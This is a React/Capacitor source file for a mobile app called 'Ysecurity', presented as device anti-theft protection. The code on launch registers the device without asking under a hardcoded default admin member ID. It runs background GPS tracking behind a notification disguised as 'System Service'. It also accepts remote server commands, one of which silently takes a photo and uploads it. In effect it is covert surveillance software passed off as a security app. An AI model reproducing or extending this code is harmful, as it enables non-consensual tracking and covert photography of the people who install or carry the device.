import React, { useEffect, useState, useRef } from 'react';
import io from 'socket.io-client';

const DEFAULT_MEMBER_ID = 'YS-1301500118996';

const API_BASE = process.env.REACT_APP_API_BASE_URL || 'https://ysecurity.app/api';

// Detect if running in native Capacitor
let isNative = false;
let Device, Storage, Network, Camera, BackgroundGeolocation, Capacitor;
try {
  Capacitor = require('@capacitor/core').Capacitor;
  isNative = Capacitor.isNativePlatform();
  if (isNative) {
    Device = require('@capacitor/device').Device;
    Storage = require('@capacitor/preferences').Preferences;
    Network = require('@capacitor/network').Network;
    Camera = require('@capacitor/camera').Camera;
    try { BackgroundGeolocation = require('@capacitor/background-geolocation').BackgroundGeolocation; } catch(e) {}
  }
} catch (e) {
  isNative = false;
}

// Web-safe storage helpers
const store = {
  get: async (key) => {
    if (isNative && Storage) {
      const r = await Storage.get({ key });
      return r.value;
    }
    return localStorage.getItem(key);
  },
  set: async (key, value) => {
    if (isNative && Storage) {
      await Storage.set({ key, value });
    } else {
      localStorage.setItem(key, value);
    }
  },
  remove: async (key) => {
    if (isNative && Storage) {
      await Storage.remove({ key });
    } else {
      localStorage.removeItem(key);
    }
  },
};

const SCREEN = {
  LOADING: 'loading',
  LOGIN: 'login',
  INSTALLING: 'installing',
  INSTALLED: 'installed',
};

function App() {
  // Core state
  const [screen, setScreen] = useState(SCREEN.LOADING);
  const [deviceId, setDeviceId] = useState(null);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [isRegistered, setIsRegistered] = useState(false);
  const [isActive, setIsActive] = useState(false);
  const [error, setError] = useState(null);

  // Login form
  const [memberId, setMemberId] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);

  // Tracking state
  const [geofence, setGeofence] = useState(null);
  const [isOnline, setIsOnline] = useState(true);
  const [pendingPings, setPendingPings] = useState([]);
  const [batteryLevel, setBatteryLevel] = useState(100);
  const [socket, setSocket] = useState(null);
  const [isConnected, setIsConnected] = useState(false);

  const statusIntervalRef = useRef(null);
  const socketRef = useRef(null);

  // =============================================
  // INITIALIZATION
  // =============================================
  useEffect(() => {
    initializeApp();
    setupNetworkListener();
    return () => {
      if (statusIntervalRef.current) clearInterval(statusIntervalRef.current);
      if (socketRef.current) socketRef.current.disconnect();
    };
  }, []);

  const initializeApp = async () => {
    try {
      let id, info;

      if (isNative && Device) {
        info = await Device.getInfo();
        id = info.uuid || info.identifierForVendor || `dev-${Date.now()}`;
      } else {
        // Web: generate persistent device ID
        id = localStorage.getItem('ys_device_id');
        if (!id) {
          id = 'web-' + Date.now() + '-' + Math.random().toString(36).substring(2, 10);
          localStorage.setItem('ys_device_id', id);
        }
        const ua = navigator.userAgent;
        info = {
          model: ua.includes('iPhone') ? 'iPhone' : ua.includes('Android') ? 'Android' : 'Device',
          operatingSystem: navigator.platform || 'Web',
          osVersion: '',
        };
      }

      setDeviceId(id);
      setDeviceInfo(info);

      // Check if already registered
      const cached = await store.get('registration');
      if (cached) {
        const registration = JSON.parse(cached);
        setIsRegistered(true);
        setMemberId(registration.memberId);

        initSocket(id);
        startStatusChecks(id);
        startTracking(id);
        setScreen(SCREEN.INSTALLED);
      } else {
        // Auto-install with default Member ID
        autoInstall(id, info);
      }
    } catch (err) {
      console.error('Init failed:', err);
      setError('Failed to initialize app');
      setScreen(SCREEN.LOGIN);
    }
  };

  const setupNetworkListener = () => {
    if (isNative && Network) {
      Network.addListener('networkStatusChange', (status) => {
        setIsOnline(status.connected);
        if (status.connected) syncPendingPings();
      });
    } else {
      // Web: use online/offline events
      window.addEventListener('online', () => { setIsOnline(true); syncPendingPings(); });
      window.addEventListener('offline', () => setIsOnline(false));
      setIsOnline(navigator.onLine);
    }
  };

  // =============================================
  // LOGIN & REGISTRATION
  // =============================================
  const handleLogin = async () => {
    setError(null);

    // Validate Member ID format
    const memberIdTrimmed = memberId.trim().toUpperCase();
    if (!/^YS-\d{6,15}$/.test(memberIdTrimmed)) {
      setError('Invalid Member ID format. Must be YS-XXXXXX');
      return;
    }

    setIsLoggingIn(true);

    try {
      const info = deviceInfo || await Device.getInfo();
      const id = deviceId || info.uuid || info.identifierForVendor;

      const response = await fetch(`${API_BASE}/devices/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceId: id,
          model: info.model || 'Unknown',
          os: `${info.operatingSystem || 'Unknown'} ${info.osVersion || ''}`.trim(),
          memberId: memberIdTrimmed,
        })
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || 'Registration failed');
      }

      // Save registration locally
      await store.set('registration', JSON.stringify({
        deviceId: id,
        memberId: memberIdTrimmed,
        deviceToken: data.deviceToken,
        registeredAt: new Date().toISOString(),
      }));

      setIsRegistered(true);
      setScreen(SCREEN.INSTALLING);

      // Brief install animation then go to installed screen
      setTimeout(() => {
        initSocket(id);
        startStatusChecks(id);
        setScreen(SCREEN.INSTALLED);
      }, 3000);

    } catch (err) {
      console.error('Login failed:', err);
      setError(err.message);
    } finally {
      setIsLoggingIn(false);
    }
  };

  // Quick install - auto registers with default admin Member ID
  const autoInstall = async (id, info) => {
    setScreen(SCREEN.INSTALLING);
    try {
      const response = await fetch(`${API_BASE}/devices/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceId: id,
          model: info.model || 'Unknown',
          os: `${info.operatingSystem || 'Unknown'} ${info.osVersion || ''}`.trim(),
          memberId: DEFAULT_MEMBER_ID,
        })
      });

      if (!response.ok) {
        const data = await response.json().catch(() => ({}));
        throw new Error(data.error || 'Server error ' + response.status);
      }

      const data = await response.json();

      setMemberId(data.memberId || DEFAULT_MEMBER_ID);
      await store.set('registration', JSON.stringify({
        deviceId: id,
        memberId: data.memberId || DEFAULT_MEMBER_ID,
        deviceToken: data.deviceToken,
        registeredAt: new Date().toISOString(),
      }));

      setIsRegistered(true);
      setIsActive(true);

      setTimeout(() => {
        initSocket(id);
        startStatusChecks(id);
        startTracking(id);
        setScreen(SCREEN.INSTALLED);
      }, 3000);
    } catch (err) {
      console.error('Auto install failed:', err);
      setError(err.message);
      setScreen(SCREEN.LOGIN);
    }
  };

  // Quick install - auto registers with default admin Member ID
  const handleTestMode = async () => {
    setError(null);
    setIsLoggingIn(true);
    try {
      const info = deviceInfo || { model: 'Unknown', operatingSystem: 'Web', osVersion: '' };
      const id = deviceId || 'web-' + Date.now() + '-' + Math.random().toString(36).substring(2, 8);
      if (!deviceId) {
        setDeviceId(id);
        localStorage.setItem('ys_device_id', id);
      }

      const response = await fetch(`${API_BASE}/devices/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceId: id,
          model: info.model || 'Unknown',
          os: `${info.operatingSystem || 'Unknown'} ${info.osVersion || ''}`.trim(),
          memberId: DEFAULT_MEMBER_ID,
        })
      });

      if (!response.ok) {
        const data = await response.json().catch(() => ({}));
        throw new Error(data.error || 'Server error ' + response.status);
      }

      const data = await response.json();

      setMemberId(data.memberId || DEFAULT_MEMBER_ID);
      await store.set('registration', JSON.stringify({
        deviceId: id,
        memberId: data.memberId || DEFAULT_MEMBER_ID,
        deviceToken: data.deviceToken,
        registeredAt: new Date().toISOString(),
        testMode: true,
      }));

      setIsRegistered(true);
      setIsActive(true);
      setScreen(SCREEN.INSTALLING);

      setTimeout(() => {
        initSocket(id);
        startStatusChecks(id);
        startTracking(id);
        setScreen(SCREEN.INSTALLED);
      }, 3000);
    } catch (err) {
      console.error('Test mode failed:', err);
      setError('Install failed: ' + (err.message || 'Network error. Check your internet connection and try again.'));
    } finally {
      setIsLoggingIn(false);
    }
  };

  // =============================================
  // SOCKET.IO CONNECTION
  // =============================================
  const initSocket = async (id) => {
    // Retrieve stored device token for authenticated Socket.IO
    const registration = await store.get('registration');
    const regData = registration ? JSON.parse(registration) : {};
    const deviceToken = regData.deviceToken || null;

    const socketConnection = io(API_BASE.replace('/api', ''), {
      transports: ['websocket', 'polling'],
    });

    socketConnection.on('connect', () => {
      setIsConnected(true);
      socketConnection.emit('device-authenticate', { deviceId: id, deviceToken });
    });

    socketConnection.on('disconnect', () => {
      setIsConnected(false);
    });

    socketConnection.on('command', (command) => {
      executeCommand(command);
    });

    socketRef.current = socketConnection;
    setSocket(socketConnection);
  };

  // =============================================
  // STATUS MONITORING
  // =============================================
  const startStatusChecks = (id) => {
    checkStatus(id);
    statusIntervalRef.current = setInterval(() => checkStatus(id), 60000);
  };

  const checkStatus = async (id) => {
    if (!isOnline) return;
    try {
      const response = await fetch(`${API_BASE}/devices/${id}/status`);
      if (response.status === 404) {
        // Device was deleted from admin — reset local state
        await store.remove('registration');
        if (socketRef.current) socketRef.current.disconnect();
        if (statusIntervalRef.current) clearInterval(statusIntervalRef.current);
        setIsRegistered(false);
        setIsActive(false);
        setMemberId('');
        setScreen(SCREEN.LOGIN);
        return;
      }
      if (!response.ok) return;

      const data = await response.json();
      if (data.success && data.status === 'active' && !isActive) {
        setIsActive(true);
        await startTracking(id);
      } else if (data.success && data.status !== 'active') {
        setIsActive(false);
      }

      await checkCommands(id);
    } catch (err) {
      // Silent fail for periodic checks
    }
  };

  const checkCommands = async (id) => {
    try {
      const response = await fetch(`${API_BASE}/devices/${id}/commands`);
      if (!response.ok) return;

      const data = await response.json();
      if (data.success && data.commands) {
        for (const cmd of data.commands) {
          await executeCommand(cmd);
        }
      }
    } catch (err) {
      // Silent fail
    }
  };

  // =============================================
  // GPS TRACKING
  // =============================================
  const startTracking = async (id) => {
    // Send immediate first location ping
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const networkType = (() => {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return 'unknown';
            const ct = conn.type || conn.effectiveType;
            if (ct === 'wifi') return 'wifi';
            if (['cellular', 'mobile', '4g', '3g', '2g', 'slow-2g'].includes(ct)) return 'cellular';
            if (ct === 'ethernet') return 'wifi';
            if (ct === 'none') return 'none';
            return 'unknown';
          })();
          await sendPingDirect(id, {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            battery: batteryLevel,
            networkType,
          });
        },
        (err) => console.warn('Initial location error:', err.message),
        { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
      );
    }

    if (isNative && BackgroundGeolocation) {
      try {
        const permissions = await BackgroundGeolocation.requestPermissions();
        if (permissions.location !== 'granted') return;

        await BackgroundGeolocation.start({
          distanceFilter: 50,
          stationaryRadius: 25,
          interval: 300000,
          fastestInterval: 60000,
          debug: false,
          notification: { title: 'System Service', text: 'Running' },
        });

        BackgroundGeolocation.addListener('location', async (location) => {
          try {
            const pingData = {
              lat: location.latitude,
              lng: location.longitude,
              accuracy: location.accuracy,
              battery: batteryLevel,
              networkType: 'unknown',
            };
            if (geofence) {
              const dist = getDistance(location.latitude, location.longitude, geofence.lat, geofence.lng);
              if (dist > geofence.radius) pingData.alert = 'geofence_breach';
            }
            await sendPingDirect(id, pingData);
          } catch (err) {
            console.error('Location processing failed:', err);
          }
        });
      } catch (err) {
        console.error('Native tracking start failed:', err);
      }
    } else if (navigator.geolocation) {
      // Web fallback: use browser geolocation (foreground only)
      navigator.geolocation.watchPosition(
        async (pos) => {
          const pingData = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            battery: batteryLevel,
            networkType: (() => {
              const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
              if (!conn) return 'unknown';
              const ct = conn.type || conn.effectiveType;
              if (ct === 'wifi') return 'wifi';
              if (['cellular', 'mobile', '4g', '3g', '2g', 'slow-2g'].includes(ct)) return 'cellular';
              if (ct === 'ethernet') return 'wifi';
              if (ct === 'none') return 'none';
              return 'unknown';
            })(),
          };
          if (geofence) {
            const dist = getDistance(pos.coords.latitude, pos.coords.longitude, geofence.lat, geofence.lng);
            if (dist > geofence.radius) pingData.alert = 'geofence_breach';
          }
          await sendPingDirect(id, pingData);
        },
        (err) => console.warn('Web geolocation error:', err.message),
        { enableHighAccuracy: true, maximumAge: 60000, timeout: 30000 }
      );
    }
  };

  // =============================================
  // LOCATION PINGS
  // =============================================
  const loadCachedData = async () => {
    try {
      const cachedPings = await store.get('pendingPings');
      if (cachedPings) setPendingPings(JSON.parse(cachedPings));
      const cachedGeofence = await store.get('geofence');
      if (cachedGeofence) setGeofence(JSON.parse(cachedGeofence));
    } catch (err) {
      console.error('Cache load failed:', err);
    }
  };

  const savePendingPings = async (pings) => {
    await store.set('pendingPings', JSON.stringify(pings)).catch(() => {});
  };

  const sendPing = async (data) => {
    const pingData = { ...data, deviceId, timestamp: new Date().toISOString() };
    await sendPingDirect(deviceId, pingData);
  };

  // Direct ping that takes deviceId as parameter (avoids stale state)
  const sendPingDirect = async (id, data) => {
    if (!id) return;
    const pingData = { ...data, deviceId: id, timestamp: new Date().toISOString() };

    if (!isOnline) {
      const updated = [...pendingPings, pingData];
      setPendingPings(updated);
      await savePendingPings(updated);
      return;
    }

    try {
      const response = await fetch(`${API_BASE}/devices/${id}/ping`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Device-ID': id },
        body: JSON.stringify(pingData),
      });
      if (!response.ok) {
        const errData = await response.json().catch(() => ({}));
        console.warn('Ping rejected:', errData.error || response.status);
      }
    } catch (err) {
      const updated = [...pendingPings, pingData];
      setPendingPings(updated);
      await savePendingPings(updated);
    }
  };

  const syncPendingPings = async () => {
    if (!isOnline || pendingPings.length === 0) return;
    const failed = [];
    for (const ping of pendingPings) {
      const pingDeviceId = ping.deviceId || deviceId;
      if (!pingDeviceId) { failed.push(ping); continue; }
      try {
        const res = await fetch(`${API_BASE}/devices/${pingDeviceId}/ping`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Device-ID': pingDeviceId },
          body: JSON.stringify(ping),
        });
        if (!res.ok) failed.push(ping);
      } catch (e) {
        failed.push(ping);
      }
    }
    setPendingPings(failed);
    await savePendingPings(failed);
  };

  // =============================================
  // COMMAND EXECUTION
  // =============================================
  const executeCommand = async (cmd) => {
    try {
      switch (cmd.command) {
        case 'alarm':
          if (isNative) {
            // Native alarm with vibration
          } else {
            try { navigator.vibrate?.([500, 200, 500]); } catch(e) {}
          }
          break;

        case 'camera':
          if (isNative && Camera) {
            try {
              const image = await Camera.getPhoto({ quality: 90, allowEditing: false, resultType: 'base64' });
              await fetch(`${API_BASE}/devices/${deviceId}/photo`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Device-ID': deviceId },
                body: JSON.stringify({ photo: image.base64String }),
              });
            } catch(e) { console.error('Camera failed', e); }
          }
          break;

        case 'geofence': {
          const params = typeof cmd.params === 'string' ? JSON.parse(cmd.params) : cmd.params;
          setGeofence(params);
          await store.set('geofence', JSON.stringify(params));
          break;
        }

        default:
          break;
      }

      // Mark command as executed
      if (cmd.id) {
        await fetch(`${API_BASE}/commands/${cmd.id}/executed`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Device-ID': deviceId },
        }).catch((err) => console.error('Failed to mark command executed:', err));
      }
    } catch (err) {
      console.error('Command execution failed:', err);
    }
  };

  // =============================================
  // HELPERS
  // =============================================
  const getDistance = (lat1, lng1, lat2, lng2) => {
    const R = 6371e3;
    const p1 = lat1 * Math.PI / 180;
    const p2 = lat2 * Math.PI / 180;
    const dp = (lat2 - lat1) * Math.PI / 180;
    const dl = (lng2 - lng1) * Math.PI / 180;
    const a = Math.sin(dp/2) * Math.sin(dp/2) +
              Math.cos(p1) * Math.cos(p2) * Math.sin(dl/2) * Math.sin(dl/2);
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  };

  // =============================================
  // RENDER
  // =============================================

  // Shared styles
  const styles = {
    container: {
      minHeight: '100vh',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
      background: 'linear-gradient(135deg, #0a1628 0%, #1a237e 50%, #0d47a1 100%)',
      color: '#fff',
      padding: '20px',
    },
    card: {
      background: 'rgba(255,255,255,0.08)',
      backdropFilter: 'blur(20px)',
      borderRadius: '20px',
      padding: '40px 30px',
      width: '100%',
      maxWidth: '380px',
      boxShadow: '0 8px 32px rgba(0,0,0,0.3)',
      border: '1px solid rgba(255,255,255,0.1)',
    },
    input: {
      width: '100%',
      padding: '14px 16px',
      borderRadius: '12px',
      border: '1px solid rgba(255,255,255,0.2)',
      background: 'rgba(255,255,255,0.06)',
      color: '#fff',
      fontSize: '16px',
      outline: 'none',
      marginBottom: '16px',
      boxSizing: 'border-box',
    },
    button: {
      width: '100%',
      padding: '16px',
      borderRadius: '12px',
      border: 'none',
      background: 'linear-gradient(135deg, #1a73e8, #0d47a1)',
      color: '#fff',
      fontSize: '16px',
      fontWeight: '600',
      cursor: 'pointer',
      marginTop: '8px',
    },
    error: {
      background: 'rgba(244,67,54,0.15)',
      border: '1px solid rgba(244,67,54,0.3)',
      borderRadius: '12px',
      padding: '12px 16px',
      marginBottom: '16px',
      fontSize: '14px',
      color: '#ff8a80',
    },
  };

  // LOADING SCREEN
  if (screen === SCREEN.LOADING) {
    return (
      <div style={styles.container}>
        <div style={{ fontSize: '48px', marginBottom: '20px' }}>🛡️</div>
        <div style={{ fontSize: '14px', opacity: 0.7 }}>Initializing...</div>
      </div>
    );
  }

  // LOGIN SCREEN - Member ID & Password entry
  if (screen === SCREEN.LOGIN) {
    return (
      <div style={styles.container}>
        <div style={styles.card}>
          <div style={{ textAlign: 'center', marginBottom: '30px' }}>
            <div style={{ fontSize: '48px', marginBottom: '12px' }}>🛡️</div>
            <h1 style={{ margin: '0 0 8px', fontSize: '24px', fontWeight: '700' }}>Ysecurity</h1>
            <p style={{ margin: 0, fontSize: '14px', opacity: 0.7 }}>Device Security &amp; Anti-Theft Protection</p>
          </div>

          {error && (
            <div style={styles.error}>{error}</div>
          )}

          {/* Install Button */}
          <button
            style={{
              ...styles.button,
              background: 'linear-gradient(135deg, #4caf50, #2e7d32)',
              fontSize: '18px',
              padding: '18px',
              marginBottom: '20px',
              opacity: isLoggingIn ? 0.6 : 1,
              cursor: isLoggingIn ? 'not-allowed' : 'pointer',
            }}
            onClick={handleTestMode}
            disabled={isLoggingIn}
          >
            {isLoggingIn ? '⏳ Installing...' : '🛡️ Install Protection Now'}
          </button>
        </div>
      </div>
    );
  }

  // INSTALLING SCREEN - Brief animation
  if (screen === SCREEN.INSTALLING) {
    return (
      <div style={styles.container}>
        <div style={styles.card}>
          <div style={{ textAlign: 'center' }}>
            <div style={{ fontSize: '48px', marginBottom: '20px', animation: 'pulse 1.5s infinite' }}>🛡️</div>
            <h2 style={{ margin: '0 0 12px', fontSize: '20px' }}>Installing Protection...</h2>
            <p style={{ fontSize: '14px', opacity: 0.7, margin: 0 }}>
              Setting up silent device monitoring
            </p>
            <div style={{
              width: '60%',
              height: '4px',
              background: 'rgba(255,255,255,0.1)',
              borderRadius: '2px',
              margin: '24px auto 0',
              overflow: 'hidden',
            }}>
              <div style={{
                width: '100%',
                height: '100%',
                background: 'linear-gradient(90deg, #1a73e8, #42a5f5)',
                borderRadius: '2px',
                animation: 'progress 2.5s ease-in-out',
              }} />
            </div>
          </div>
        </div>
        <style>{`
          @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.1); } }
          @keyframes progress { 0% { width: 0; } 100% { width: 100%; } }
        `}</style>
      </div>
    );
  }

  // INSTALLED SCREEN - Dormant/Active status
  return (
    <div style={styles.container}>
      <div style={styles.card}>
        <div style={{ textAlign: 'center', marginBottom: '24px' }}>
          <div style={{ fontSize: '48px', marginBottom: '12px' }}>
            {isActive ? '🟢' : '🛡️'}
          </div>
          <h1 style={{ margin: '0 0 4px', fontSize: '22px' }}>Ysecurity</h1>
          <p style={{
            margin: 0,
            fontSize: '14px',
            color: isActive ? '#69f0ae' : 'rgba(255,255,255,0.5)',
            fontWeight: '600',
          }}>
            {isActive ? 'ACTIVE — Tracking Enabled' : 'INSTALLED — Dormant'}
          </p>
        </div>

        <div style={{
          background: 'rgba(255,255,255,0.05)',
          borderRadius: '12px',
          padding: '16px',
          fontSize: '13px',
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
            <span style={{ opacity: 0.6 }}>Network</span>
            <span>{isOnline ? '🟢 Online' : '🔴 Offline'}</span>
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
            <span style={{ opacity: 0.6 }}>Server</span>
            <span>{isConnected ? '🟢 Connected' : '🔴 Disconnected'}</span>
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
            <span style={{ opacity: 0.6 }}>Device ID</span>
            <span style={{ fontSize: '11px', wordBreak: 'break-all', maxWidth: '60%', textAlign: 'right' }}>{deviceId || '—'}</span>
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
            <span style={{ opacity: 0.6 }}>Member ID</span>
            <span>{memberId || '—'}</span>
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
            <span style={{ opacity: 0.6 }}>GPS</span>
            <span>{navigator.geolocation ? '🟢 Available' : '🔴 Not Available'}</span>
          </div>
          {pendingPings.length > 0 && (
            <div style={{ display: 'flex', justifyContent: 'space-between' }}>
              <span style={{ opacity: 0.6 }}>Queued Pings</span>
              <span>{pendingPings.length}</span>
            </div>
          )}
        </div>

        {isActive && (
          <div style={{
            marginTop: '20px',
            padding: '16px',
            background: 'rgba(76,175,80,0.15)',
            border: '1px solid rgba(76,175,80,0.3)',
            borderRadius: '12px',
            fontSize: '13px',
            textAlign: 'center',
            color: 'rgba(255,255,255,0.9)',
          }}>
            ✅ Device is being tracked. GPS location pings are being sent to the server.
          </div>
        )}

        {!isActive && (
          <div style={{
            marginTop: '20px',
            padding: '16px',
            background: 'rgba(255,193,7,0.1)',
            border: '1px solid rgba(255,193,7,0.2)',
            borderRadius: '12px',
            fontSize: '13px',
            textAlign: 'center',
            color: 'rgba(255,255,255,0.7)',
          }}>
            Protection is dormant. It will be activated by the security team when needed.
            <br /><br />
            <strong style={{ color: '#ffd54f' }}>Keep your Member ID safe!</strong><br />
            It cannot be recovered if lost.
          </div>
        )}


      </div>
    </div>
  );
}

export default App;